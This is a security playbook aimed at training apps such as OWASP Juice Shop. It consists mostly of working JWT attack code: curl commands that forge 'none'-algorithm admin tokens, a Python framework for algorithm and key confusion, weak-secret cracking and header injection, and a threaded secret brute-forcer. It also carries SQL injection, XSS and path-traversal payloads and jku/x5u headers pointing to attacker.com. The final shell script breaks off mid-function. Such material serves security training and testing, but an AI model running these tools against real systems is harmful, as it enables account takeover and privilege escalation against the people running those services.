# Playbook 10: JWT Token Exploitation

## Objective

Identify and exploit vulnerabilities in JSON Web Token (JWT) implementations across OWASP Juice Shop, DVWA, XVWA, and WebGoat to achieve unauthorized access and privilege escalation.

## Prerequisites

- Target applications running locally or accessible
- Python 3.x with PyJWT, cryptography, requests, base64
- JWT.io for manual token analysis
- Burp Suite with JWT Editor extension
- Understanding of JWT structure (header.payload.signature)

## Target Applications Setup

```bash
# OWASP Juice Shop (uses JWTs extensively)
docker run -p 3000:3000 bkimminich/juice-shop

# DVWA (with JWT authentication enabled)
docker run -p 80:80 vulnerables/web-dvwa

# XVWA (custom JWT implementation)
docker run -p 8080:80 tuxotron/xvwa

# WebGoat (JWT lessons)
docker run -p 8081:8080 webgoat/goatandwolf
```

## Manual Testing Commands

### 1. JWT Discovery and Extraction

```bash
# Extract JWT from authentication response
curl -s -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' | \
  jq -r '.authentication.token'

# Decode JWT components
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ"

# Decode header
echo $TOKEN | cut -d'.' -f1 | base64 -d | jq .

# Decode payload
echo $TOKEN | cut -d'.' -f2 | base64 -d | jq .

# Extract signature
echo $TOKEN | cut -d'.' -f3
```

### 2. JWT Algorithm Confusion Attack

```bash
# Create none algorithm JWT
HEADER='{"typ":"JWT","alg":"none"}'
PAYLOAD='{"sub":"admin","role":"administrator","exp":9999999999}'

HEADER_B64=$(echo -n $HEADER | base64 | tr -d '=')
PAYLOAD_B64=$(echo -n $PAYLOAD | base64 | tr -d '=')

NONE_JWT="${HEADER_B64}.${PAYLOAD_B64}."

# Test with none algorithm
curl -s "http://localhost:3000/rest/user/whoami" \
  -H "Authorization: Bearer $NONE_JWT"
```

### 3. JWT Secret Brute Force

```bash
# Common JWT secrets to test
SECRETS=("secret" "key" "jwt" "token" "password" "admin" "123456" "qwerty")

for secret in "${SECRETS[@]}"; do
  echo "Testing secret: $secret"
  # Use jwt_tool or similar to test
  python3 jwt_tool.py $TOKEN -C -d /path/to/wordlist.txt
done
```

### 4. JWT Key Confusion Attack (RS256 to HS256)

```bash
# Extract public key from RS256 JWT application
curl -s "http://localhost:3000/.well-known/jwks.json" | jq .

# Convert public key to HMAC secret and sign new token
# (This requires custom tools/scripts)
```

## Automated Python Scripts

### Comprehensive JWT Exploitation Tool

```python
#!/usr/bin/env python3
"""
JWT Exploitation Framework
Comprehensive tool for testing JWT vulnerabilities
"""

import jwt
import json
import base64
import hmac
import hashlib
import requests
import time
import itertools
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
import re

class JWTExploiter:
    def __init__(self, target_url, app_type="juice-shop"):
        self.target_url = target_url
        self.app_type = app_type
        self.session = requests.Session()
        self.vulnerabilities = []
        self.jwt_tokens = []

    def test_all_jwt_vulnerabilities(self):
        """Run comprehensive JWT vulnerability tests"""
        print(f"[*] Testing JWT vulnerabilities on {self.target_url}")

        # Get JWT tokens from the application
        self.extract_jwt_tokens()

        if not self.jwt_tokens:
            print("[-] No JWT tokens found to test")
            return

        for token_data in self.jwt_tokens:
            token = token_data['token']
            print(f"\n[*] Testing token: {token[:50]}...")

            # Test suite
            self.test_algorithm_confusion(token)
            self.test_none_algorithm(token)
            self.test_weak_secret(token)
            self.test_key_confusion(token)
            self.test_payload_manipulation(token)
            self.test_timestamp_attacks(token)
            self.test_injection_attacks(token)
            self.test_jwt_header_injection(token)

        self.generate_report()

    def extract_jwt_tokens(self):
        """Extract JWT tokens from various application endpoints"""
        print("[*] Extracting JWT tokens from application...")

        # Authentication endpoints for different apps
        auth_configs = {
            "juice-shop": {
                "login_url": "/rest/user/login",
                "credentials": {"email": "admin@juice-sh.op", "password": "admin123"},
                "token_path": ["authentication", "token"]
            },
            "dvwa": {
                "login_url": "/login.php",
                "credentials": {"username": "admin", "password": "password"},
                "token_path": ["jwt"]
            },
            "webgoat": {
                "login_url": "/WebGoat/login",
                "credentials": {"username": "guest", "password": "guest"},
                "token_path": ["access_token"]
            }
        }

        if self.app_type in auth_configs:
            config = auth_configs[self.app_type]

            try:
                response = self.session.post(
                    f"{self.target_url}{config['login_url']}",
                    json=config['credentials']
                )

                if response.status_code == 200:
                    data = response.json()

                    # Navigate through token path
                    token = data
                    for key in config['token_path']:
                        if key in token:
                            token = token[key]
                        else:
                            token = None
                            break

                    if token and self.is_jwt(token):
                        self.jwt_tokens.append({
                            'token': token,
                            'source': 'login',
                            'endpoint': config['login_url']
                        })
                        print(f"[+] JWT token extracted from login")

            except Exception as e:
                print(f"[-] Error extracting token from login: {e}")

        # Look for JWTs in cookies and headers
        self.extract_tokens_from_responses()

        # Try common JWT endpoints
        self.probe_jwt_endpoints()

    def extract_tokens_from_responses(self):
        """Extract JWTs from various response locations"""
        test_endpoints = ["/", "/profile", "/api/user", "/rest/user/whoami"]

        for endpoint in test_endpoints:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}")

                # Check response body for JWTs
                jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                matches = re.findall(jwt_pattern, response.text)

                for match in matches:
                    if self.is_jwt(match):
                        self.jwt_tokens.append({
                            'token': match,
                            'source': 'response_body',
                            'endpoint': endpoint
                        })

                # Check cookies for JWTs
                for cookie in response.cookies:
                    if self.is_jwt(cookie.value):
                        self.jwt_tokens.append({
                            'token': cookie.value,
                            'source': 'cookie',
                            'endpoint': endpoint,
                            'cookie_name': cookie.name
                        })

                # Check headers for JWTs
                for header, value in response.headers.items():
                    if self.is_jwt(value):
                        self.jwt_tokens.append({
                            'token': value,
                            'source': 'header',
                            'endpoint': endpoint,
                            'header_name': header
                        })

            except Exception as e:
                continue

    def probe_jwt_endpoints(self):
        """Probe common JWT-related endpoints"""
        jwt_endpoints = [
            "/.well-known/jwks.json",
            "/api/auth/jwks",
            "/jwks.json",
            "/auth/jwks",
            "/.well-known/openid_configuration"
        ]

        for endpoint in jwt_endpoints:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}")

                if response.status_code == 200:
                    print(f"[+] Found JWT endpoint: {endpoint}")

                    # Look for keys that might be used for verification
                    if "jwks" in endpoint or "jwks" in response.text:
                        self.analyze_jwks(response.json())

            except Exception as e:
                continue

    def is_jwt(self, token):
        """Check if string is a valid JWT format"""
        if not isinstance(token, str):
            return False

        parts = token.split('.')
        if len(parts) != 3:
            return False

        try:
            # Try to decode header and payload
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '==='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==='))

            # Check for typical JWT claims
            return 'typ' in header or 'alg' in header or any(
                claim in payload for claim in ['iss', 'sub', 'aud', 'exp', 'iat', 'nbf']
            )

        except:
            return False

    def decode_jwt(self, token):
        """Safely decode JWT without verification"""
        try:
            parts = token.split('.')

            header = json.loads(base64.urlsafe_b64decode(parts[0] + '==='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==='))
            signature = parts[2]

            return {
                'header': header,
                'payload': payload,
                'signature': signature
            }

        except Exception as e:
            print(f"[-] Error decoding JWT: {e}")
            return None

    def test_algorithm_confusion(self, token):
        """Test for algorithm confusion vulnerabilities"""
        print("[*] Testing algorithm confusion...")

        decoded = self.decode_jwt(token)
        if not decoded:
            return

        original_alg = decoded['header'].get('alg', 'HS256')

        # Test algorithm confusion attacks
        confusion_attacks = [
            {'alg': 'none', 'description': 'None algorithm bypass'},
            {'alg': 'HS256', 'description': 'Force HMAC when expecting RSA'},
            {'alg': 'HS512', 'description': 'Algorithm downgrade'},
            {'alg': 'RS256', 'description': 'Force RSA when expecting HMAC'}
        ]

        for attack in confusion_attacks:
            if attack['alg'] != original_alg:
                manipulated_token = self.create_token_with_algorithm(
                    decoded, attack['alg']
                )

                if self.test_token_validity(manipulated_token):
                    self.vulnerabilities.append({
                        'type': 'Algorithm Confusion',
                        'severity': 'High',
                        'original_alg': original_alg,
                        'attack_alg': attack['alg'],
                        'description': attack['description'],
                        'token': manipulated_token
                    })

    def test_none_algorithm(self, token):
        """Test none algorithm vulnerability"""
        print("[*] Testing none algorithm bypass...")

        decoded = self.decode_jwt(token)
        if not decoded:
            return

        # Create token with none algorithm
        none_header = decoded['header'].copy()
        none_header['alg'] = 'none'

        # Modify payload for privilege escalation
        none_payload = decoded['payload'].copy()

        # Common privilege escalation modifications
        privilege_tests = [
            {'admin': True},
            {'role': 'admin'},
            {'role': 'administrator'},
            {'isAdmin': True},
            {'user_type': 'admin'},
            {'privileges': ['admin']},
            {'scope': 'admin'}
        ]

        for privilege_mod in privilege_tests:
            test_payload = none_payload.copy()
            test_payload.update(privilege_mod)

            none_token = self.create_none_algorithm_token(none_header, test_payload)

            if self.test_token_validity(none_token):
                self.vulnerabilities.append({
                    'type': 'None Algorithm Bypass',
                    'severity': 'Critical',
                    'privilege_modification': privilege_mod,
                    'description': 'JWT accepts none algorithm for authentication',
                    'token': none_token
                })

    def create_none_algorithm_token(self, header, payload):
        """Create JWT with none algorithm"""
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()

        return f"{header_b64}.{payload_b64}."

    def test_weak_secret(self, token):
        """Test for weak JWT secrets"""
        print("[*] Testing weak JWT secrets...")

        decoded = self.decode_jwt(token)
        if not decoded or decoded['header'].get('alg', '').startswith('RS'):
            return  # Skip RSA algorithms

        # Common weak secrets
        weak_secrets = [
            'secret', 'key', 'jwt', 'token', 'password', 'admin', 'test',
            '123456', 'qwerty', 'abc123', 'secret123', 'jwt_secret',
            'your-256-bit-secret', 'your-512-bit-secret', 'secretkey',
            '', 'null', 'undefined', 'jwt-key', 'signing-key'
        ]

        for secret in weak_secrets:
            try:
                # Try to decode with this secret
                jwt.decode(token, secret, algorithms=['HS256', 'HS512'])

                # If successful, create malicious token
                malicious_payload = decoded['payload'].copy()
                malicious_payload.update({
                    'admin': True,
                    'role': 'administrator',
                    'exp': int(time.time()) + 3600  # Extend expiration
                })

                malicious_token = jwt.encode(
                    malicious_payload, secret, algorithm='HS256'
                )

                self.vulnerabilities.append({
                    'type': 'Weak JWT Secret',
                    'severity': 'Critical',
                    'secret': secret,
                    'description': f'JWT signed with weak secret: {secret}',
                    'malicious_token': malicious_token
                })
                break

            except jwt.InvalidSignatureError:
                continue
            except Exception as e:
                continue

    def test_key_confusion(self, token):
        """Test for RSA/HMAC key confusion"""
        print("[*] Testing key confusion attacks...")

        decoded = self.decode_jwt(token)
        if not decoded:
            return

        algorithm = decoded['header'].get('alg', '')

        if algorithm.startswith('RS'):
            # Try to get public key and use it as HMAC secret
            public_key = self.get_public_key()

            if public_key:
                try:
                    # Create malicious payload
                    malicious_payload = decoded['payload'].copy()
                    malicious_payload.update({
                        'admin': True,
                        'role': 'administrator'
                    })

                    # Sign with public key as HMAC secret
                    malicious_token = jwt.encode(
                        malicious_payload,
                        public_key,
                        algorithm='HS256'
                    )

                    if self.test_token_validity(malicious_token):
                        self.vulnerabilities.append({
                            'type': 'Key Confusion Attack',
                            'severity': 'Critical',
                            'description': 'RSA public key used as HMAC secret',
                            'original_alg': algorithm,
                            'attack_alg': 'HS256',
                            'malicious_token': malicious_token
                        })

                except Exception as e:
                    print(f"[-] Key confusion test failed: {e}")

    def get_public_key(self):
        """Extract public key from JWKS endpoint or certificate"""
        jwks_endpoints = [
            "/.well-known/jwks.json",
            "/api/auth/jwks",
            "/jwks.json"
        ]

        for endpoint in jwks_endpoints:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}")

                if response.status_code == 200:
                    jwks = response.json()

                    if 'keys' in jwks and len(jwks['keys']) > 0:
                        key_data = jwks['keys'][0]

                        # Convert JWK to PEM format (simplified)
                        if 'x5c' in key_data:
                            cert_der = base64.b64decode(key_data['x5c'][0])
                            return cert_der

            except Exception as e:
                continue

        return None

    def test_payload_manipulation(self, token):
        """Test payload manipulation vulnerabilities"""
        print("[*] Testing payload manipulation...")

        decoded = self.decode_jwt(token)
        if not decoded:
            return

        # Test various payload modifications
        manipulations = [
            {'admin': True, 'description': 'Admin privilege escalation'},
            {'role': 'admin', 'description': 'Role escalation to admin'},
            {'user_id': '1', 'description': 'User ID manipulation'},
            {'exp': int(time.time()) + 86400, 'description': 'Token expiration extension'},
            {'iss': 'attacker.com', 'description': 'Issuer manipulation'},
            {'aud': 'admin-panel', 'description': 'Audience manipulation'},
        ]

        for manipulation in manipulations:
            test_payload = decoded['payload'].copy()
            test_payload.update({k: v for k, v in manipulation.items() if k != 'description'})

            # Create unsigned token (for apps that don't verify signature)
            manipulated_token = self.create_unsigned_token(decoded['header'], test_payload)

            if self.test_token_validity(manipulated_token):
                self.vulnerabilities.append({
                    'type': 'Payload Manipulation',
                    'severity': 'High',
                    'manipulation': manipulation,
                    'description': f"JWT payload manipulation: {manipulation['description']}",
                    'token': manipulated_token
                })

    def create_unsigned_token(self, header, payload):
        """Create token without proper signature"""
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()

        # Use original signature (might work if verification is weak)
        return f"{header_b64}.{payload_b64}.invalid_signature"

    def test_timestamp_attacks(self, token):
        """Test timestamp-related vulnerabilities"""
        print("[*] Testing timestamp attacks...")

        decoded = self.decode_jwt(token)
        if not decoded:
            return

        payload = decoded['payload']

        # Test expired token acceptance
        if 'exp' in payload:
            expired_payload = payload.copy()
            expired_payload['exp'] = int(time.time()) - 3600  # Expired 1 hour ago

            expired_token = self.create_unsigned_token(decoded['header'], expired_payload)

            if self.test_token_validity(expired_token):
                self.vulnerabilities.append({
                    'type': 'Expired Token Acceptance',
                    'severity': 'Medium',
                    'description': 'Application accepts expired JWT tokens',
                    'token': expired_token
                })

        # Test future token acceptance
        if 'nbf' in payload:
            future_payload = payload.copy()
            future_payload['nbf'] = int(time.time()) + 3600  # Valid in 1 hour

            future_token = self.create_unsigned_token(decoded['header'], future_payload)

            if self.test_token_validity(future_token):
                self.vulnerabilities.append({
                    'type': 'Future Token Acceptance',
                    'severity': 'Low',
                    'description': 'Application accepts not-before future tokens',
                    'token': future_token
                })

    def test_injection_attacks(self, token):
        """Test injection attacks in JWT claims"""
        print("[*] Testing injection attacks...")

        decoded = self.decode_jwt(token)
        if not decoded:
            return

        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM admin_users --"
        ]

        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>"
        ]

        # NoSQL injection payloads
        nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$regex": ".*"}
        ]

        # Test string fields for injection
        for field, value in decoded['payload'].items():
            if isinstance(value, str):
                # Test SQL injection
                for sql_payload in sql_payloads:
                    test_payload = decoded['payload'].copy()
                    test_payload[field] = sql_payload

                    injection_token = self.create_unsigned_token(decoded['header'], test_payload)

                    if self.test_injection_response(injection_token, 'sql'):
                        self.vulnerabilities.append({
                            'type': 'JWT SQL Injection',
                            'severity': 'High',
                            'field': field,
                            'payload': sql_payload,
                            'description': f'SQL injection in JWT field: {field}'
                        })

                # Test XSS
                for xss_payload in xss_payloads:
                    test_payload = decoded['payload'].copy()
                    test_payload[field] = xss_payload

                    injection_token = self.create_unsigned_token(decoded['header'], test_payload)

                    if self.test_injection_response(injection_token, 'xss'):
                        self.vulnerabilities.append({
                            'type': 'JWT XSS',
                            'severity': 'Medium',
                            'field': field,
                            'payload': xss_payload,
                            'description': f'XSS in JWT field: {field}'
                        })

    def test_injection_response(self, token, injection_type):
        """Test if injection payload in JWT causes expected response"""
        try:
            response = self.session.get(
                f"{self.target_url}/profile",
                headers={'Authorization': f'Bearer {token}'}
            )

            if injection_type == 'sql':
                # Look for SQL error indicators
                sql_errors = ['sql', 'mysql', 'sqlite', 'postgres', 'syntax error']
                return any(error in response.text.lower() for error in sql_errors)

            elif injection_type == 'xss':
                # Look for XSS payload reflection
                return '<script>' in response.text or 'alert(' in response.text

        except Exception as e:
            return False

        return False

    def test_jwt_header_injection(self, token):
        """Test JWT header injection vulnerabilities"""
        print("[*] Testing JWT header injection...")

        decoded = self.decode_jwt(token)
        if not decoded:
            return

        # Test various header injections
        header_injections = [
            {'jku': 'http://attacker.com/jwks.json', 'description': 'JKU header injection'},
            {'x5u': 'http://attacker.com/cert.pem', 'description': 'X5U header injection'},
            {'kid': '../../../etc/passwd', 'description': 'Key ID path traversal'},
            {'kid': 'http://attacker.com/key', 'description': 'Key ID URL injection'},
            {'crit': ['jku'], 'description': 'Critical header manipulation'}
        ]

        for injection in header_injections:
            test_header = decoded['header'].copy()
            test_header.update({k: v for k, v in injection.items() if k != 'description'})

            malicious_token = self.create_unsigned_token(test_header, decoded['payload'])

            if self.test_token_validity(malicious_token):
                self.vulnerabilities.append({
                    'type': 'JWT Header Injection',
                    'severity': 'High',
                    'injection': injection,
                    'description': injection['description'],
                    'token': malicious_token
                })

    def create_token_with_algorithm(self, decoded, algorithm):
        """Create token with specified algorithm"""
        new_header = decoded['header'].copy()
        new_header['alg'] = algorithm

        if algorithm == 'none':
            return self.create_none_algorithm_token(new_header, decoded['payload'])
        else:
            # For other algorithms, create unsigned token
            return self.create_unsigned_token(new_header, decoded['payload'])

    def test_token_validity(self, token):
        """Test if token is accepted by the application"""
        test_endpoints = [
            '/profile',
            '/api/user',
            '/rest/user/whoami',
            '/user/profile'
        ]

        for endpoint in test_endpoints:
            try:
                response = self.session.get(
                    f"{self.target_url}{endpoint}",
                    headers={'Authorization': f'Bearer {token}'}
                )

                # Token is likely valid if we get 200 and not an auth error
                if response.status_code == 200:
                    # Check if response contains user data (not error)
                    if not any(error in response.text.lower() for error in
                              ['unauthorized', 'invalid token', 'access denied', 'forbidden']):
                        return True

            except Exception as e:
                continue

        return False

    def analyze_jwks(self, jwks_data):
        """Analyze JWKS data for vulnerabilities"""
        print("[*] Analyzing JWKS data...")

        if 'keys' in jwks_data:
            for i, key in enumerate(jwks_data['keys']):
                print(f"[*] Key {i+1}: {key}")

                # Check for weak key parameters
                if key.get('kty') == 'RSA':
                    if 'n' in key and 'e' in key:
                        # Check key size (simplified check)
                        n_size = len(base64.urlsafe_b64decode(key['n'] + '===')) * 8
                        if n_size < 2048:
                            self.vulnerabilities.append({
                                'type': 'Weak RSA Key',
                                'severity': 'Medium',
                                'key_size': n_size,
                                'description': f'RSA key size {n_size} bits is too small'
                            })

    def generate_report(self):
        """Generate comprehensive JWT vulnerability report"""
        print("\n" + "="*70)
        print("JWT EXPLOITATION REPORT")
        print("="*70)

        if not self.vulnerabilities:
            print("[+] No JWT vulnerabilities found")
            return

        # Group by severity
        critical = [v for v in self.vulnerabilities if v['severity'] == 'Critical']
        high = [v for v in self.vulnerabilities if v['severity'] == 'High']
        medium = [v for v in self.vulnerabilities if v['severity'] == 'Medium']
        low = [v for v in self.vulnerabilities if v['severity'] == 'Low']

        if critical:
            print(f"\n🔴 CRITICAL VULNERABILITIES ({len(critical)}):")
            for vuln in critical:
                print(f"   [!] {vuln['type']}")
                print(f"       {vuln['description']}")

        if high:
            print(f"\n🟠 HIGH RISK VULNERABILITIES ({len(high)}):")
            for vuln in high:
                print(f"   [!] {vuln['type']}")
                print(f"       {vuln['description']}")

        if medium:
            print(f"\n🟡 MEDIUM RISK VULNERABILITIES ({len(medium)}):")
            for vuln in medium:
                print(f"   [*] {vuln['type']}")
                print(f"       {vuln['description']}")

        if low:
            print(f"\n🟢 LOW RISK VULNERABILITIES ({len(low)}):")
            for vuln in low:
                print(f"   [-] {vuln['type']}")
                print(f"       {vuln['description']}")

        print(f"\n[*] Total vulnerabilities: {len(self.vulnerabilities)}")

        # Risk score calculation
        risk_score = len(critical) * 4 + len(high) * 3 + len(medium) * 2 + len(low) * 1

        if risk_score >= 15:
            print("🔴 OVERALL RISK: CRITICAL")
        elif risk_score >= 10:
            print("🟠 OVERALL RISK: HIGH")
        elif risk_score >= 5:
            print("🟡 OVERALL RISK: MEDIUM")
        else:
            print("🟢 OVERALL RISK: LOW")

class JWTToolkit:
    """Additional JWT manipulation tools"""

    @staticmethod
    def brute_force_secret(token, wordlist_path):
        """Brute force JWT secret using wordlist"""
        try:
            with open(wordlist_path, 'r') as f:
                secrets = [line.strip() for line in f]
        except FileNotFoundError:
            # Use built-in common secrets
            secrets = [
                'secret', 'key', 'jwt', 'token', 'password', 'admin', 'test',
                '123456', 'qwerty', 'abc123', 'secret123', 'jwt_secret'
            ]

        for secret in secrets:
            try:
                jwt.decode(token, secret, algorithms=['HS256', 'HS512'])
                return secret
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue

        return None

    @staticmethod
    def create_malicious_jwt(original_token, payload_modifications, secret=None):
        """Create malicious JWT with modified payload"""
        try:
            if secret:
                # Decode with known secret
                decoded = jwt.decode(original_token, secret, algorithms=['HS256', 'HS512'])
            else:
                # Decode without verification
                decoded = jwt.decode(original_token, options={"verify_signature": False})

            # Apply modifications
            decoded.update(payload_modifications)

            if secret:
                # Re-encode with secret
                return jwt.encode(decoded, secret, algorithm='HS256')
            else:
                # Create none algorithm token
                header = {"typ": "JWT", "alg": "none"}
                header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
                payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded).encode()).rstrip(b'=').decode()
                return f"{header_b64}.{payload_b64}."

        except Exception as e:
            print(f"[-] Error creating malicious JWT: {e}")
            return None

if __name__ == "__main__":
    # Test specific application
    exploiter = JWTExploiter("http://localhost:3000", "juice-shop")
    exploiter.test_all_jwt_vulnerabilities()

    # Example of using toolkit
    # secret = JWTToolkit.brute_force_secret(token, "/path/to/wordlist.txt")
    # if secret:
    #     malicious = JWTToolkit.create_malicious_jwt(token, {"admin": True}, secret)
```

### JWT Secret Brute Forcer

```python
#!/usr/bin/env python3
"""
JWT Secret Brute Force Tool
Specialized tool for discovering weak JWT secrets
"""

import jwt
import requests
import threading
import time
from queue import Queue

class JWTSecretBruteForcer:
    def __init__(self, token, target_url=None):
        self.token = token
        self.target_url = target_url
        self.found_secret = None
        self.tested_count = 0

    def brute_force_with_wordlist(self, wordlist_path, threads=10):
        """Brute force JWT secret using wordlist with threading"""
        print(f"[*] Starting JWT secret brute force with {threads} threads")

        # Load wordlist
        try:
            with open(wordlist_path, 'r') as f:
                secrets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Wordlist file not found: {wordlist_path}")
            return None

        # Create queue and threads
        secret_queue = Queue()

        # Fill queue
        for secret in secrets:
            secret_queue.put(secret)

        # Start threads
        threads_list = []
        for i in range(threads):
            thread = threading.Thread(target=self.worker_thread, args=(secret_queue,))
            thread.daemon = True
            thread.start()
            threads_list.append(thread)

        # Wait for completion or secret found
        while not secret_queue.empty() and not self.found_secret:
            time.sleep(0.1)

        return self.found_secret

    def worker_thread(self, secret_queue):
        """Worker thread for testing secrets"""
        while not secret_queue.empty() and not self.found_secret:
            try:
                secret = secret_queue.get_nowait()
                if self.test_secret(secret):
                    self.found_secret = secret
                    print(f"\n[+] JWT secret found: {secret}")
                    break

                self.tested_count += 1
                if self.tested_count % 100 == 0:
                    print(f"[*] Tested {self.tested_count} secrets...")

            except:
                break

    def test_secret(self, secret):
        """Test if secret can decode the JWT"""
        try:
            jwt.decode(self.token, secret, algorithms=['HS256', 'HS512'])
            return True
        except jwt.InvalidSignatureError:
            return False
        except Exception:
            return False

    def generate_common_secrets(self):
        """Generate common JWT secrets"""
        common_secrets = [
            # Default secrets
            'secret', 'key', 'jwt', 'token', 'password', 'admin', 'test',

            # Weak passwords
            '123456', 'qwerty', 'abc123', 'password123', 'admin123',

            # JWT-specific
            'jwt_secret', 'jwt-secret', 'jwt.secret', 'jwtsecret',
            'your-256-bit-secret', 'your-512-bit-secret',

            # Application names
            'juice-shop', 'dvwa', 'webgoat', 'xvwa',

            # Empty/null values
            '', 'null', 'undefined', 'none',

            # Base64 encoded common secrets
            'c2VjcmV0',  # 'secret'
            'cGFzc3dvcmQ=',  # 'password'

            # Hex values
            'deadbeef', 'cafebabe', '1337', 'abcd1234',
        ]

        return common_secrets

    def smart_brute_force(self):
        """Smart brute force using common patterns"""
        print("[*] Starting smart JWT secret brute force...")

        # Test common secrets first
        common_secrets = self.generate_common_secrets()

        for secret in common_secrets:
            if self.test_secret(secret):
                print(f"[+] JWT secret found (common): {secret}")
                return secret

        # Generate variations
        variations = self.generate_secret_variations()

        for secret in variations:
            if self.test_secret(secret):
                print(f"[+] JWT secret found (variation): {secret}")
                return secret

        print("[-] No weak secret found with smart brute force")
        return None

    def generate_secret_variations(self):
        """Generate secret variations based on common patterns"""
        base_words = ['secret', 'key', 'jwt', 'token', 'admin', 'app']
        numbers = ['123', '456', '789', '2023', '2024', '2025']
        symbols = ['!', '@', '#', '$', '&', '*']

        variations = []

        # Word + number combinations
        for word in base_words:
            for num in numbers:
                variations.extend([
                    word + num,
                    num + word,
                    word + '_' + num,
                    word + '-' + num
                ])

        # Word + symbol combinations
        for word in base_words:
            for symbol in symbols:
                variations.extend([
                    word + symbol,
                    symbol + word
                ])

        # Case variations
        for word in base_words:
            variations.extend([
                word.upper(),
                word.capitalize(),
                word.lower()
            ])

        return list(set(variations))  # Remove duplicates

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python jwt_bruteforce.py <JWT_TOKEN> [wordlist_path]")
        sys.exit(1)

    token = sys.argv[1]
    wordlist = sys.argv[2] if len(sys.argv) > 2 else None

    bruteforcer = JWTSecretBruteForcer(token)

    # Try smart brute force first
    secret = bruteforcer.smart_brute_force()

    # If not found and wordlist provided, try wordlist
    if not secret and wordlist:
        secret = bruteforcer.brute_force_with_wordlist(wordlist)

    if secret:
        print(f"\n[+] SUCCESS! JWT secret: {secret}")

        # Create example malicious token
        try:
            decoded = jwt.decode(token, secret, algorithms=['HS256', 'HS512'])
            print(f"[*] Original payload: {decoded}")

            # Create admin token
            admin_payload = decoded.copy()
            admin_payload.update({
                'admin': True,
                'role': 'administrator',
                'exp': int(time.time()) + 3600
            })

            admin_token = jwt.encode(admin_payload, secret, algorithm='HS256')
            print(f"[+] Admin token: {admin_token}")

        except Exception as e:
            print(f"[-] Error creating admin token: {e}")
    else:
        print("[-] No weak secret found")
```

## Shell Scripts

### JWT Testing Script

```bash
#!/bin/bash
# JWT Vulnerability Testing Script

TARGET_APPS=("http://localhost:3000" "http://localhost:80" "http://localhost:8080" "http://localhost:8081")
APP_NAMES=("Juice-Shop" "DVWA" "XVWA" "WebGoat")

echo "=== JWT Vulnerability Testing ==="

# Function to decode JWT
decode_jwt() {
    local token=$1
    local part=$2  # header, payload, or signature

    case $part in
        "header")
            echo $token | cut -d'.' -f1 | base64 -d 2>/dev/null | jq . 2>/dev/null
            ;;
        "payload")
            echo $token | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null
            ;;
        "signature")
            echo $token | cut -d'.' -f3
            ;;
    esac
}

# Function to create none algorithm JWT
create_none_jwt() {
    local original_token=$1

    # Extract payload
    local payload=$(echo $original_token | cut -d'.' -f2)

    # Create none algorithm header
    local header='{"typ":"JWT","alg":"none"}'
    local header_b64=$(echo -n $header | base64 | tr -d '=' | tr '+/' '-_')

    # Modify payload to add admin privileges
    local decoded_payload=$(echo $payload | base64 -d 2>/dev/null)
    local admin_payload='{"admin":true,"role":"administrator","exp":9999999999}'
    local admin_payload_b64=$(echo -n $admin_payload | base64 | tr -d '=' | tr '+/' '-_')

    echo "${header_b64}.${admin_payload_b64}."
}

# Function to test JWT endpoints
test_jwt_endpoints() {
    local url=$1
    local app_name=$2

    echo "[*] Testing JWT endpoints for $app_name..."

    # Common JWT endpoints
    local endpoints=(
        "/.well-known/jwks.json"
        "/api/auth/jwks"
        "/jwks.json"
        "/auth/jwks"
        "/.well-known/openid_configuration"
    )

    for endpoint in "${endpoints[@]}"; do
        response=$(curl -s -w "%{http_code}" "$url$endpoint")
        http_code="${response: -3}"

        if [[ "$http_code" == "200" ]]; then
            echo "[+] Found JWT endpoint: $endpoint"

            # Check for keys
            if echo "$response" | grep -q "keys\|jwks"; then
                echo "[*] JWKS data found at $endpoint"
            fi
        fi
    done
}

# Function to extract JWT tokens
extract_jwt_token() {
    local url=$1
    local app_name=$2

    echo "[*] Extracting JWT token from $app_name..."

    case $app_name in
        "Juice-Shop")
            local token=$(curl -s -X POST "$url/rest/user/login" \
                -H "Content-Type: application/json" \
                -d '{"email":"admin@juice-sh.op","password":"admin123"}' | \
                jq -r '.authentication.token' 2>/dev/null)
            ;;
        "DVWA")
            # DVWA may not use JWTs by default
            local token=""
            ;;
        *)
            local token=""
            ;;
    esac

    if [[ "$token" != "null" && "$token" != "" ]]; then
        echo "[+] JWT token extracted: ${token:0:50}..."
        echo "$token"
    else
        echo "[-] No JWT token found"
        echo ""
    fi
}

# Function to test JWT vulnerabilities
test_jwt_vulnerabilities() {
    local token=$1
    local url=$2
    local app_name=$3

    if [[ -z "$token" || "$token" == "null" ]]; then
        echo "[-] No token to test"
        return
    fi

